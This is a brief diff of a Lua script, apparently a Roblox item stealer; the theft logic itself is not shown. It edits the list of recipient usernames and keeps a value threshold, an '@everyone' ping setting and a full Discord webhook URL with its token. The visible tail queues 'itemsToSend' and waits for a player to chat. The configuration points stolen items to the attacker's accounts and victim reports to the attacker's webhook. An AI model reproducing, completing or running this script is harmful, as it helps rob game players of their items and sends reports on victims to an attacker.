@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-_G.Usernames = {"Sarznetto", "SarzenttoPrivareS"}
+_G.Usernames = {"SarzenttoPrivareS"}
 _G.min_value = 1000
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1411240284829913199/fBpM111taG_HHu_wOhoU1jPcbKN_m3wD7poHt6pGIm-VdfqfxO6HyT1qxKepX6ik8lat"
@@ -370,4 +370,5 @@ if #itemsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
+
 end
